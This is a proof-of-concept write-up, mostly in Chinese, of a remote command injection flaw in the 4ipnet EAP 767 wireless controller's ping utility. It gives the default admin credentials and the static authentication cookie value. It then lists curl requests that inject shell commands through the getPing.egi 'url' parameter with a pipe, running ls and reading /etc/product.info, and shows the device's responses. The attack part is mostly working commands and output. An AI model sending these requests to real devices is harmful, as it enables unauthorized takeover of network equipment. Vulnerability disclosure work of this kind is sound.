# PoC for 4ipnet EAP 767

```zsh!
❯ curl -I http://{host}/
HTTP/1.1 302 Moved Temporarily
Date: Mon, 15 Jan 2024 01:10:14 GMT
Server: Mbedthis-Appweb/2.4.2
Cache-Control: no-cache
ETag: "29e-122-2b9cb3e0"
Content-length: 88
Connection: keep-alive
Keep-Alive: timeout=60, max=100
Location: http://{host}/login.asp
```
![upload_1ab1ac81f80c42b992f6c4fc96be40e8](https://hackmd.io/_uploads/SkdCNTVYp.png)



從該網頁服務登入頁面，發現為 4ipnet 無線網路控制器

![upload_247c7496749603bc7b9772d11afd7ba4](https://hackmd.io/_uploads/r1TkSTEtT.png)



**查詢網路教學，取得該 IOT 預設密碼**

**Web console 功能**
系統概述
![upload_fa6cb02d32f831033c013c4142586a4f](https://hackmd.io/_uploads/BJmbrpVF6.png)

管理介面有 `Home > Utilities > Network Utilities` 功能，可透過網頁執行 ping, tracert, arping 等網路測試行為
![upload_9925e6bd58df1d54d022f404504adbef](https://hackmd.io/_uploads/HJOzH6VFa.png)

## 漏洞 PoC
**PoC I @ Browser**

前端有做 input text 檢測，驗證 input text 是否合規
![upload_0d41715f59b4037ce1b9dcea6c9d31ce](https://hackmd.io/_uploads/BkOXBpEFT.png)

改由後端下手，從 network 確認 http request 特徵
![upload_b87e4fa1fea137d1feba67001f4ca104](https://hackmd.io/_uploads/SkeSHHp4FT.png)

![upload_354d5ac2dd8284e800fa818cf166f489](https://hackmd.io/_uploads/S1fLHaVKa.png)



http request 特徵
```asp!
# request 1
http://{host}/getPing.egi?url=127.0.0.1

# request 2
http://{host}/getPing.egi?pid=940
```
:::info
可發現其 ping 功能為先將 `url` 作為 query string 參數送出，並取得 `pid`, 再批次透過 `pid` 參數取得 ping output，最終將結果呈現至網頁
:::

發現該管理介面僅依賴 cookie name/value 作為 user 身分證驗依據。


| Name | Value |
| -------- | -------- |
| username     | admin    |
| password     |  17lgP6vqCV1Ko   |

:::danger
使用同 1 組帳密(admin)不論重新登入幾次，cookie 內容均不變
:::

![upload_3ecdb0b545bf10be16816293036534e8](https://hackmd.io/_uploads/SJEarpVFa.png)



**PoC II @ cmd**

使用 curl 工具模擬 http request 存取管理介面 home page，被導入登入頁面

![upload_f3925ef9b1edaae1b762ad800322d80d](https://hackmd.io/_uploads/HkUDIaVKp.png)


使用 curl 工具模擬 http request 並帶入上述取得 cookie，證實可使用需驗證身分授權之管理介面 home page

![upload_a76b368249757b325d6f3bcc4ab24d88](https://hackmd.io/_uploads/rJEjUT4YT.png)

嘗試存取 `getPing.egi` 頁面，並將 query string 參數`url` 使用escape 特殊字元(`;`,`|`)嘗試跳脫後並注入指定 command

**Attemp I with `;`**
被後端程式檢測為不合法字元
```zsh!
❯ curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=127.0.0.1;"
HTTP/1.1 200 OK
Date: Mon, 15 Jan 2024 01:49:25 GMT
Server: Mbedthis-Appweb/2.4.2
Cache-Control: no-cache
Content-type: text/html
Content-length: 29
Connection: keep-alive
Keep-Alive: timeout=60, max=100

Illegal Characters of URL.
OK%                              
```
![upload_6b5b52a9a94d27f7ace8850892ba7f77](https://hackmd.io/_uploads/SkoxD6Vta.png)


**Attemp II with `|`**
成功跳脫!!! 並取得 `pid`!!!

```zsh!
❯ curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=127.0.0.1|"
HTTP/1.1 200 OK
Date: Mon, 15 Jan 2024 01:52:49 GMT
Server: Mbedthis-Appweb/2.4.2
Cache-Control: no-cache
Content-type: text/html
Content-length: 4
Connection: keep-alive
Keep-Alive: timeout=60, max=100

3704%      
```
![upload_77cdaa3fe2e0c85b8506ec8aa926a65b](https://hackmd.io/_uploads/B1HBwaNKp.png)


注入`ls` 列出當前目錄
```zsh!
 curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=|ls"
 ```
 ![upload_686276a082e16b2f204e75e987d55b0f](https://hackmd.io/_uploads/B1htDTNYa.png)

注入`ls -l` 列出當前目錄結構，檔案權限,檔案類型，修改日期等資訊
```zsh!
 curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=|ls%20-l"
 ```
 
 ![upload_caee4f89b8ef4271c2f50521c479fe61](https://hackmd.io/_uploads/rysCvpNt6.png)

:::success
證實該產品存在遠端程式碼執行(RCE)漏洞， 可透過傳入`url` parameter: input_text + pipe + command 執行任意指令
:::


## 確認設備廠牌型號
```zsh!
curl -b "username=admin; password=17lgP6vqCV1Ko" "{host}/getPing.egi?url=|cat%20/etc/product.info"
```
![upload_c8581cfbd913fe193766cbad839cefc7](https://hackmd.io/_uploads/H1DZ_aEtT.png)

## Reference
https://hkitblog.com/12770/
https://www.lienshen.com.tw/sidebar1_01-2-11.html
https://www.netadmin.com.tw/netadmin/zh-tw/snapshot/0E91A5D929C04C40AB6A6B88592725E1